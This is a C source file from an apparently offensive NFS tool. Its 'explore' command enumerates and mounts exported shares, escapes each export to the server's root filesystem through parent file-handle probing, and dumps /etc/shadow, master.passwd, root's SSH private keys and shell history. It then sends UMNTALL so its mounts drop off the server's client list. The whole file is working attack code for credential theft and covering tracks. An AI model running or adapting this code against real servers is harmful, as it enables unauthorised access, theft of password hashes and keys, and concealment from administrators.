/*
 * Copyright (C)  2023-2026 Claes M Nyberg <cmn@signedness.org>
 * Copyright (C)  2025-2026 John Cartwright <johnc@grok.org.uk>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Claes M Nyberg and
 *      John Cartwright.
 * 4. The names Claes M Nyberg and John Cartwright may not be used to endorse
 *    or promote products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * explore.c - Automatic filesystem exploration
 *
 * Provides the "explore" command for recursive enumeration of NFS exports.
 * Mounts each share, traverses up to find root, then explores interesting
 * directories like /etc, /root, /home.
 */

#include <errno.h>
#include <stdlib.h>
#include <string.h>

#include "ansicolors.h"
#include "cmdparse.h"
#include "display.h"
#include "explore.h"
#include "mount.h"
#include "nfs.h"
#include "nfs_cache.h"
#include "nfs_escape.h"
#include "nfscli.h"
#include "pathctx.h"
#include "print.h"
#include "str.h"
#include "transfer.h"

/*
 * Lookup file in directory and print contents to terminal.
 */
static void
showfile(struct nfsctx *ctx, const struct nfs_fh *dirfh, const char *name)
{
    struct nfs_lookup_res lu;
    int64_t bytes;

    print(V_INFO, ctx, "Attempting to show file %s\n", name);

    memset(&lu, 0, sizeof(lu));
    if (nfs_lookup(ctx, dirfh, name, &lu) < 0)
        return;

    bytes = transfer_download(ctx, lu.fh.data, lu.fh.len, 0, stdout, DL_NEWLINE);
    if (bytes > 0)
        printf("-- EOF\n");
}

/*
 * Exploration targets - what to look for in a root filesystem
 */
#define EXPLORE_LIST  0x01 /* List directory contents */
#define EXPLORE_FILES 0x02 /* Show specific files */

static const char *ssh_files[] = {
    "authorized_keys", "id_rsa", "id_rsa.pub",
    "id_ed25519", "id_ed25519.pub", "known_hosts", NULL};
static const char *etc_files[] = {"passwd", "master.passwd", "shadow", NULL};
static const char *root_files[] = {".history", NULL};

static const struct {
    const char *path;
    int flags;
    const char **files;
} targets[] = {
    {"root", EXPLORE_LIST | EXPLORE_FILES, root_files},
    {"root/.ssh", EXPLORE_LIST | EXPLORE_FILES, ssh_files},
    {"home", EXPLORE_LIST, NULL},
    {"etc", EXPLORE_FILES, etc_files},
};

/*
 * Explore interesting directories from root filesystem.
 */
static void
explore_rootfs(struct nfsctx *ctx, const struct nfs_fh *rootfh, int use_colors)
{
    struct nfs_fh fh;
    const char **fp;
    size_t i;
    int flags = use_colors ? ATTRSTR_COLORS : 0;
    int saved_quiet;

    saved_quiet = ctx->quiet;
    ctx->quiet = 1;

    for (i = 0; i < sizeof(targets) / sizeof(targets[0]); i++) {
        if (path_walk(ctx, rootfh, targets[i].path, &fh) < 0)
            continue;

        if (targets[i].flags & EXPLORE_LIST) {
            print(V_INFO, ctx, "Listing /%s\n", targets[i].path);
            list_dir_plus(ctx, flags, fh.data, fh.len);
        }

        if ((targets[i].flags & EXPLORE_FILES) && targets[i].files) {
            for (fp = targets[i].files; *fp; fp++)
                showfile(ctx, &fh, *fp);
        }
    }

    ctx->quiet = saved_quiet;
}

/*
 * Find the topmost directory from the shared path.
 * Uses nfs_probe_escape_one() to try both LOOKUP and READDIRPLUS methods.
 * Returns file handle length on success, -1 on error.
 */
static int
find_topdir(struct nfsctx *ctx, struct mount_export *share,
    struct nfs_fh *out_fh, int use_colors)
{
    struct nfs_fh curr;
    struct nfs_fh parent;
    struct nfs_escape_diag diag;
    char hexbuf[NFS_FHSIZE_MAX * 2 + 1];
    int is_v3, ret, depth, level;
    int flags = use_colors ? ATTRSTR_COLORS : 0;
    size_t plen;

    print(V_INFO, ctx, "Listing directories for share %s%s%s\n",
        COLOR_BOLD, share->name, COLOR_RESET);

    nfs_fh_from_buf(&curr, share->fh, share->fhlen);
    is_v3 = ctx->proto.nfs_version >= 3;
    depth = path_count_components(share->name);

    for (level = 0; level <= depth; level++) {
        /* List current directory */
        if (is_v3)
            list_dir_plus(ctx, flags, curr.data, curr.len);
        else
            list_dir(ctx, flags, curr.data, curr.len);

        /* Done if we've traversed all levels */
        if (level == depth)
            break;

        plen = path_prefix_len(share->name, depth - level - 1);
        print(V_INFO, ctx, "Escaping to %.*s\n",
            (int)plen, share->name);
        print(V_INFO, ctx, "Current:         FH:%s\n",
            str_hex(curr.data, curr.len, hexbuf, sizeof(hexbuf)));

        /* Try to escape one level up */
        ret = nfs_probe_escape_one(ctx, &curr, &parent, &diag);

        /* Print diagnostic info - show what was tried */
        if (is_v3 && diag.rdp_tried) {
            if (diag.rdp_got_fh)
                print(V_INFO, ctx, "(READDIRPLUS) .. FH:%s\n",
                    str_hex(diag.rdp_fh.data, diag.rdp_fh.len, hexbuf, sizeof(hexbuf)));
            else
                print(V_INFO, ctx, "(READDIRPLUS) .. (no FH)\n");
        }
        if (diag.lu_tried) {
            if (diag.lu_got_fh)
                print(V_INFO, ctx, "(LOOKUP)      .. FH:%s\n",
                    str_hex(diag.lu_fh.data, diag.lu_fh.len, hexbuf, sizeof(hexbuf)));
            else
                print(V_INFO, ctx, "(LOOKUP)      .. (no FH)\n");
        }

        if (ret <= 0) {
            /* Hit ceiling early - can't escape further */
            plen = path_prefix_len(share->name, depth - level);
            print(V_INFO, ctx, "Cannot escape above %.*s\n",
                (int)plen, share->name);
            print(V_INFO, ctx, "Done trying to list top directory for share %s%s%s\n",
                COLOR_BOLD, share->name, COLOR_RESET);
            nfs_fh_copy(out_fh, &curr);
            return 0; /* Did not reach root */
        }

        /* Move up */
        nfs_fh_copy(&curr, &parent);
    }

    /* Reached root */
    print(V_INFO, ctx, "%sReached root filesystem%s\n", COLOR_BRED, COLOR_RESET);
    print(V_INFO, ctx, "Done trying to list top directory for share %s%s%s\n",
        COLOR_BOLD, share->name, COLOR_RESET);

    nfs_fh_copy(out_fh, &curr);
    return curr.len;
}

int
cmd_explore(struct nfsctx *ctx, int argc, char **argv)
{
    struct mount_export *xpl, *shares, *tmp;
    struct parsed_args pa;
    struct nfs_fh topfh;
    int use_colors, fh_all;
    int saved_quiet;
    size_t tablen;

    if (parse_cmdline(argc, argv, "a", 0, 0, &pa) < 0)
        return -1;

    use_colors = ctx->term.use_colors;
    fh_all = strchr(pa.opts, 'a') != NULL;

    /* Resolve mount port if needed */
    if (ctx->ports.mountd == 0) {
        print(V_INFO, ctx, "Port unknown for mount service, attempting to resolve\n");
        init_mount_version(ctx);
        if (ctx->ports.mountd == 0) {
            fprintf(stderr, "*** mount service unavailable\n");
            return -1;
        }
    }

    /* Check if NFS service is available before doing any work */
    if (!nfs_service_available(ctx)) {
        fprintf(stderr, "*** NFS service unavailable on %s\n",
            ctx->server.name ? ctx->server.name : "server");
        return -1;
    }

    /* Clear caches to ensure fresh probing each run */
    nfs_cache_invalidate_all(ctx);
    nfs_parent_cache_clear();

    /* Get list of shares */
    print(V_INFO, ctx, "Mount port resolved to %u\n", ntohs(ctx->ports.mountd));
    print(V_INFO, ctx, "Retrieving list of shares\n");
    if (mount_get_exports(ctx, &shares) < 0)
        return -1;

    /* Print all shares */
    for (xpl = shares; xpl != NULL; xpl = xpl->next) {
        printf("%s ", xpl->name);
        for (tablen = strlen(xpl->name); tablen < TABALIGN; tablen++)
            putchar('_');
        printf(" %s\n", xpl->group);
    }

    /* Check if any shares are accessible */
    if (!fh_all) {
        int has_everyone = 0;
        for (xpl = shares; xpl != NULL; xpl = xpl->next) {
            if (xpl->everyone) {
                has_everyone = 1;
                break;
            }
        }
        if (!has_everyone) {
            print(V_INFO, ctx, "No world-accessible shares (use -a to try all)\n");
            /* Free shares list and return */
            for (xpl = shares; xpl != NULL;) {
                tmp = xpl->next;
                free(xpl);
                xpl = tmp;
            }
            return 0;
        }
    }

    /* Mount accessible shares and print file handles */
    print(V_INFO, ctx, "Mounting filesystems\n");
    saved_quiet = ctx->quiet;
    ctx->quiet = 1; /* Suppress internal mount errors */

    for (xpl = shares; xpl != NULL; xpl = xpl->next) {
        if (fh_all || xpl->everyone) {
            if (use_colors)
                printf(COLOR_BOLD);
            printf("%s ", xpl->name);
            for (tablen = strlen(xpl->name); tablen < TABALIGN; tablen++)
                putchar('_');
            printf(" ");
            if (use_colors)
                printf(COLOR_RESET);
            fflush(stdout);

            xpl->fh = malloc(NFS_FHSIZE_MAX);
            if (xpl->fh != NULL) {
                xpl->fhlen = mount_mnt_cached(ctx, xpl->name, xpl->fh, NFS_FHSIZE_MAX, 0);
                if (xpl->fhlen > 0) {
                    printf("FH:");
                    if (use_colors)
                        printf(COLOR_BRED);
                    HEXDUMP(xpl->fh, xpl->fhlen);
                    if (use_colors)
                        printf(COLOR_RESET);
                } else {
                    int err = errno;
                    free(xpl->fh);
                    xpl->fh = NULL;
                    xpl->fhlen = 0;
                    printf("Mount failed (%s)\n", strerror(err));
                }
            }
        }
    }

    ctx->quiet = saved_quiet;

    /* Clear us from client list */
    print(V_INFO, ctx, "Sending UMNTALL command to clear us from client list\n");
    saved_quiet = ctx->quiet;
    ctx->quiet = 1;
    if (mount_umntall(ctx) < 0) {
        ctx->quiet = saved_quiet;
        print(V_INFO, ctx, "UMNTALL not supported, using individual UMNT calls\n");
        for (tmp = shares; tmp != NULL; tmp = tmp->next) {
            if (tmp->fhlen > 0)
                mount_umnt(ctx, tmp->name);
        }
    } else {
        ctx->quiet = saved_quiet;
    }

    init_nfs_version(ctx);

    /* Traverse each share to find filesystem root and explore */
    for (xpl = shares; xpl != NULL;) {
        if (xpl->fhlen > 0) {
            if (find_topdir(ctx, xpl, &topfh, use_colors) > 0)
                explore_rootfs(ctx, &topfh, use_colors);
        }

        tmp = xpl->next;
        free(xpl->fh);
        free(xpl);
        xpl = tmp;
    }

    return 0;
}
